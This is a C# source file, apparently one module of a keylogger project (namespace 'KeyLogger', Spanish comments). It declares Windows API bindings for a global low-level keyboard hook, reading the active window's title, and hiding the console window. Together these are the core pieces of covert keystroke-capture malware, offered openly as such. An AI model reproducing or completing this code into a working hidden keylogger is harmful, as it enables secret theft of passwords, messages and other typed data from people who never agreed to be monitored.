using System;
using System.Runtime.InteropServices;

namespace KeyLogger
{
	/// <summary>
	///		Métodos y constantes de la API de Windows
	/// </summary>
	internal static class WindowsApi
	{
		// Constantes para ocultar una ventana
		internal const int SW_HIDE = 0;
		// Constantes del teclado
		internal const int WH_KEYBOARD_LL = 13;
		internal const int WM_KEYDOWN = 0x0100;

		/// <summary>
		///		Obtiene la ventana activa
		/// </summary>
		[DllImport("user32.dll")]
		internal static extern IntPtr GetForegroundWindow();

		/// <summary>
		///		Obtiene el título de una ventana
		/// </summary>
		[DllImport("user32.dll")]
		internal static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);

		/// <summary>
		///		Asocia un delegado a un hook
		/// </summary>
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		internal static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, 
													   IntPtr hMod, uint dwThreadId);

		/// <summary>
		///		Desasocia un delegado de hook
		/// </summary>
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		internal static extern bool UnhookWindowsHookEx(IntPtr hhk);

		/// <summary>
		///		Llama al siguiente manejador
		/// </summary>
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		internal static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

		/// <summary>
		///		Obtiene un manejador a un módulo
		/// </summary>
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		internal static extern IntPtr GetModuleHandle(string lpModuleName);

		/// <summary>
		///		Obtiene un puntero a la ventana de consola
		/// </summary>
		[DllImport("kernel32.dll")]
		internal static extern IntPtr GetConsoleWindow();

		/// <summary>
		///		Muestra / oculta una ventana
		/// </summary>
		[DllImport("user32.dll")]
		internal static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		/// <summary>
		///		Delegado para asociarse a los eventos de teclado
		/// </summary>
		internal delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
	}
}
